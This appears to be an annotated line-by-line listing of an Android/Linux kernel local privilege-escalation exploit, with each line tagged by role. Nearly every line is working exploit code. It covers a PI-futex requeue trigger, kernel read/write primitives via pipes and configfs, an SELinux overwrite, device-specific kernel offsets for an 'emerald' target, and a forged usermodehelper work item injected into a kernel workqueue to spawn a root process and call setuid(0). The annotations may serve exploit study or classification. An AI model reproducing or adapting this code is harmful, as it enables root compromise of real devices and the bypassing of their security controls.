+src/core/slide.c,409,pi_futex_sequence,"futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,"
+src/core/slide.c,420,target_specific_layout,for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
+src/core/slide.c,429,target_specific_layout,"fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));"
+src/core/slide.c,430,target_specific_layout,"fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));"
+src/core/target.h,47,target_specific_layout,#define SLIDE_NFULNL_LOGGER_OFF 0x024021a0ULL
+src/core/target.h,48,target_specific_layout,#define SLIDE_LOGGERS_0_1_OFF 0x024020f0ULL
+src/core/target.h,49,target_specific_layout,#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x026aa868ULL
+src/core/target.h,50,target_specific_layout,#define SLIDE_SYSCTL_BOOTID_OFF 0x026aa868ULL
+src/core/target.h,74,target_specific_layout,#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
+src/core/target.h,75,target_specific_layout,#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
+src/core/target.h,76,target_specific_layout,#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
+src/core/target.h,77,target_specific_layout,#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
+src/core/target.h,78,target_specific_layout,#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
+src/core/target.h,79,target_specific_layout,#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
+src/core/target.h,138,target_specific_layout,#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
+src/core/target.h,139,target_specific_layout,#define STRUCT_SLAB_CACHE_OFF 0x08
+src/core/target.h,140,target_specific_layout,#define STRUCT_PAGE_TYPE_OFF 0x30
+src/core/target.h,191,target_specific_layout,#define SLIDE_PSELECT_WORD_SHIFT 2
+src/core/target.h,192,target_specific_layout,#define SLIDE_PSELECT_NFDS 320
+src/core/target.h,193,target_specific_layout,#define SLIDE_USE_SELECT 1
+src/core/umh_root.c,2,target_specific_layout,"#include ""runtime_struct_offsets.h"""
+src/core/umh_root.c,23,credential_or_execution_transition,struct umh_subprocess_info {
+src/core/umh_root.c,36,credential_or_execution_transition,struct umh_completion {
+src/core/umh_root.c,45,credential_or_execution_transition,struct umh_kernel_data {
+src/core/umh_root.c,46,credential_or_execution_transition,struct umh_completion completion;
+src/core/umh_root.c,54,credential_or_execution_transition,"_Static_assert(sizeof(struct umh_subprocess_info) == 112,"
+src/core/umh_root.c,56,credential_or_execution_transition,"_Static_assert(sizeof(struct umh_completion) == 32,"
+src/core/umh_root.c,59,credential_or_execution_transition,static int umh_read_data(
+src/core/umh_root.c,61,kernel_memory_primitive,"if (pipe_phys_read_data(fd, target, data, len))"
+src/core/umh_root.c,63,kernel_memory_primitive,"return kernel_read_data(fd, target, data, len) == (ssize_t)len;"
+src/core/umh_root.c,66,credential_or_execution_transition,static int umh_write_data(
+src/core/umh_root.c,68,kernel_memory_primitive,"if (pipe_phys_write_data(fd, target, data, len))"
+src/core/umh_root.c,70,kernel_memory_primitive,"return kernel_write_data(fd, target, data, len) == (ssize_t)len;"
+src/core/umh_root.c,73,credential_or_execution_transition,"static uint64_t umh_read64(int fd, uintptr_t target) {"
+src/core/umh_root.c,75,credential_or_execution_transition,"umh_read_data(fd, target, &value, sizeof(value));"
+src/core/umh_root.c,79,credential_or_execution_transition,"static uint32_t umh_read32(int fd, uintptr_t target) {"
+src/core/umh_root.c,80,credential_or_execution_transition,"return (uint32_t)umh_read64(fd, target);"
+src/core/umh_root.c,83,credential_or_execution_transition,"static int umh_write64(int fd, uintptr_t target, uint64_t value) {"
+src/core/umh_root.c,84,credential_or_execution_transition,"return umh_write_data(fd, target, &value, sizeof(value));"
+src/core/umh_root.c,87,credential_or_execution_transition,"static int umh_write32(int fd, uintptr_t target, uint32_t value) {"
+src/core/umh_root.c,88,credential_or_execution_transition,"return umh_write_data(fd, target, &value, sizeof(value));"
+src/core/umh_root.c,111,credential_or_execution_transition,int install_umh_root(int configfs_fd) {
+src/core/umh_root.c,111,kernel_memory_primitive,int install_umh_root(int configfs_fd) {
+src/core/umh_root.c,112,target_specific_layout,if (!active_offsets ||
+src/core/umh_root.c,113,target_specific_layout,!active_offsets->off_system_unbound_wq ||
+src/core/umh_root.c,114,credential_or_execution_transition,!active_offsets->off_call_usermodehelper_exec_work) {
+src/core/umh_root.c,114,target_specific_layout,!active_offsets->off_call_usermodehelper_exec_work) {
+src/core/umh_root.c,115,target_specific_layout,"pr_error(""umh: missing workqueue offsets in table\n"");"
+src/core/umh_root.c,119,kernel_memory_primitive,int fd = configfs_fd;
+src/core/umh_root.c,121,target_specific_layout,KIMAGE_TEXT_BASE + active_offsets->off_system_unbound_wq;
+src/core/umh_root.c,123,credential_or_execution_transition,KIMAGE_TEXT_BASE + active_offsets->off_call_usermodehelper_exec_work;
+src/core/umh_root.c,123,target_specific_layout,KIMAGE_TEXT_BASE + active_offsets->off_call_usermodehelper_exec_work;
+src/core/umh_root.c,127,kernel_memory_primitive,"if (!pipe_phys_write_data(fd, selinux_addr,"
+src/core/umh_root.c,134,credential_or_execution_transition,"uintptr_t wq = umh_read64(fd, wq_slot);"
+src/core/umh_root.c,135,credential_or_execution_transition,"uintptr_t pwq = umh_read64(fd, wq + WQ_DFL_PWQ_OFF);"
+src/core/umh_root.c,136,credential_or_execution_transition,"uintptr_t pool = umh_read64(fd, pwq + PWQ_POOL_OFF);"
+src/core/umh_root.c,137,credential_or_execution_transition,"uintptr_t pwq_wq = umh_read64(fd, pwq + PWQ_WQ_OFF);"
+src/core/umh_root.c,152,credential_or_execution_transition,"list_next = umh_read64(fd, worklist);"
+src/core/umh_root.c,153,credential_or_execution_transition,"list_prev = umh_read64(fd, worklist + sizeof(uint64_t));"
+src/core/umh_root.c,154,credential_or_execution_transition,"nr_idle = umh_read32(fd, pool + POOL_NR_IDLE_OFF);"
+src/core/umh_root.c,167,credential_or_execution_transition,"uint32_t color = umh_read32(fd, pwq + PWQ_WORK_COLOR_OFF);"
+src/core/umh_root.c,168,credential_or_execution_transition,"uint32_t refcnt = umh_read32(fd, pwq + PWQ_REFCNT_OFF);"
+src/core/umh_root.c,169,credential_or_execution_transition,"uint32_t nr_active = umh_read32(fd, pwq + PWQ_NR_ACTIVE_OFF);"
+src/core/umh_root.c,170,credential_or_execution_transition,"uint32_t max_active = umh_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF);"
+src/core/umh_root.c,179,credential_or_execution_transition,uintptr_t umh_data_addr = page_base + UMH_DATA_OFF;
+src/core/umh_root.c,181,credential_or_execution_transition,struct umh_kernel_data umh_data;
+src/core/umh_root.c,182,credential_or_execution_transition,"memset(&umh_data, 0, sizeof(umh_data));"
+src/core/umh_root.c,184,credential_or_execution_transition,"if (snprintf(umh_data.path, sizeof(umh_data.path), ""%s"","
+src/core/umh_root.c,185,credential_or_execution_transition,UMH_BINARY_PATH) >= (int)sizeof(umh_data.path)) {
+src/core/umh_root.c,189,credential_or_execution_transition,"snprintf(umh_data.arg, sizeof(umh_data.arg), ""%s"", ""--umh"");"
+src/core/umh_root.c,190,credential_or_execution_transition,"snprintf(umh_data.uid, sizeof(umh_data.uid), ""%u"", getuid());"
+src/core/umh_root.c,193,credential_or_execution_transition,"umh_data_addr + offsetof(struct umh_kernel_data, completion);"
+src/core/umh_root.c,193,target_specific_layout,"umh_data_addr + offsetof(struct umh_kernel_data, completion);"
+src/core/umh_root.c,195,credential_or_execution_transition,"completion_addr + offsetof(struct umh_completion, next);"
+src/core/umh_root.c,195,target_specific_layout,"completion_addr + offsetof(struct umh_completion, next);"
+src/core/umh_root.c,197,credential_or_execution_transition,"umh_data_addr + offsetof(struct umh_kernel_data, path);"
+src/core/umh_root.c,197,target_specific_layout,"umh_data_addr + offsetof(struct umh_kernel_data, path);"
+src/core/umh_root.c,199,credential_or_execution_transition,"umh_data_addr + offsetof(struct umh_kernel_data, arg);"
+src/core/umh_root.c,199,target_specific_layout,"umh_data_addr + offsetof(struct umh_kernel_data, arg);"
+src/core/umh_root.c,201,credential_or_execution_transition,"umh_data_addr + offsetof(struct umh_kernel_data, uid);"
+src/core/umh_root.c,201,target_specific_layout,"umh_data_addr + offsetof(struct umh_kernel_data, uid);"
+src/core/umh_root.c,203,credential_or_execution_transition,"umh_data_addr + offsetof(struct umh_kernel_data, argv);"
+src/core/umh_root.c,203,target_specific_layout,"umh_data_addr + offsetof(struct umh_kernel_data, argv);"
+src/core/umh_root.c,205,credential_or_execution_transition,"umh_data_addr + offsetof(struct umh_kernel_data, envp);"
+src/core/umh_root.c,205,target_specific_layout,"umh_data_addr + offsetof(struct umh_kernel_data, envp);"
+src/core/umh_root.c,207,credential_or_execution_transition,umh_data.completion.next = wait_list_addr;
+src/core/umh_root.c,208,credential_or_execution_transition,umh_data.completion.prev = wait_list_addr;
+src/core/umh_root.c,210,credential_or_execution_transition,umh_data.argv[0] = path_addr;
+src/core/umh_root.c,211,credential_or_execution_transition,umh_data.argv[1] = arg_addr;
+src/core/umh_root.c,212,credential_or_execution_transition,umh_data.argv[2] = uid_addr;
+src/core/umh_root.c,213,credential_or_execution_transition,umh_data.argv[3] = 0;
+src/core/umh_root.c,214,credential_or_execution_transition,umh_data.envp[0] = 0;
+src/core/umh_root.c,216,credential_or_execution_transition,uint64_t umh_work_func = text_addr(exec_work_image);
+src/core/umh_root.c,219,credential_or_execution_transition,"uint32_t nr_inflight = umh_read32(fd, inflight_addr);"
+src/core/umh_root.c,223,credential_or_execution_transition,struct umh_subprocess_info fake;
+src/core/umh_root.c,229,credential_or_execution_transition,"memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func, sizeof(umh_work_func));"
+src/core/umh_root.c,235,credential_or_execution_transition,int data_ok = umh_write_data(
+src/core/umh_root.c,236,credential_or_execution_transition,"fd, umh_data_addr, &umh_data, sizeof(umh_data));"
+src/core/umh_root.c,237,credential_or_execution_transition,int work_ok = umh_write_data(
+src/core/umh_root.c,241,credential_or_execution_transition,"umh_write32(fd, inflight_addr, nr_inflight + 1) &&"
+src/core/umh_root.c,242,credential_or_execution_transition,"umh_write32(fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1) &&"
+src/core/umh_root.c,243,credential_or_execution_transition,"umh_write32(fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);"
+src/core/umh_root.c,245,credential_or_execution_transition,int lp_ok = umh_write64(
+src/core/umh_root.c,247,credential_or_execution_transition,"int ln_ok = lp_ok && umh_write64(fd, worklist, fake_entry);"
+src/core/umh_root.c,265,credential_or_execution_transition,"complete_done = umh_read32(fd, completion_addr);"
+src/core/umh_root.c,272,credential_or_execution_transition,int32_t umh_retval = (int32_t)umh_read32(
+src/core/umh_root.c,273,credential_or_execution_transition,"fd, fake_work_addr + offsetof(struct umh_subprocess_info, retval));"
+src/core/umh_root.c,273,target_specific_layout,"fd, fake_work_addr + offsetof(struct umh_subprocess_info, retval));"
+src/core/umh_root.c,276,credential_or_execution_transition,"wake_ok, complete_done, umh_retval);"
+src/core/umh_root.c,282,credential_or_execution_transition,if (umh_retval != 0) {
+src/core/umh_root.c,283,credential_or_execution_transition,"pr_error(""umh: kernel exec failed retval=%d\n"", umh_retval);"
+src/core/umh_root.c,288,credential_or_execution_transition,root_uid_after = 0;
+src/core/umh_root.c,292,credential_or_execution_transition,"void handle_umh_mode(int argc, char **argv) {"
+src/core/umh_root.c,298,credential_or_execution_transition,setuid(0);
+src/devices/emerald/offsets.h,2,target_specific_layout,".kernel_phys_load=0x40000000, .phys_offset=0x40000000, STRUCT_OFFSETS_6_12,"
+src/devices/emerald/offsets.h,10,orchestration,".off_ashmem_mmap=0x00D808EC, .off_ashmem_open=0x00D80948,"
+src/devices/emerald/offsets.h,12,kernel_memory_primitive,".off_configfs_read_iter=0x005127F0, .off_configfs_bin_write_iter=0x00512A24,"
+src/devices/emerald/offsets.h,16,target_specific_layout,".off_slide_boot_id=0x02699868,"
+src/devices/emerald/offsets.h,18,credential_or_execution_transition,".off_system_unbound_wq=0x01839250, .off_call_usermodehelper_exec_work=0x000F7E74,"
+src/devices/offsets.h,6,target_specific_layout,struct kernel_offsets {
+src/devices/offsets.h,9,target_specific_layout,uint64_t kernel_phys_load;
+src/devices/offsets.h,11,target_specific_layout,uint64_t phys_offset;
+src/devices/offsets.h,16,orchestration,"uint64_t off_ashmem_ioctl, off_ashmem_compat_ioctl, off_ashmem_mmap;"
+src/devices/offsets.h,18,kernel_memory_primitive,"uint64_t off_configfs_read_iter, off_configfs_bin_write_iter;"
+src/devices/offsets.h,20,target_specific_layout,"uint64_t off_slide_nfulnl_logger, off_slide_loggers_0_1, off_slide_boot_id;"
+src/devices/offsets.h,23,credential_or_execution_transition,uint64_t off_call_usermodehelper_exec_work;
+src/devices/offsets.h,52,target_specific_layout,static const struct kernel_offsets known_offsets[] = {
+src/devices/offsets.h,54,target_specific_layout,"#include ""emerald/offsets.h"""
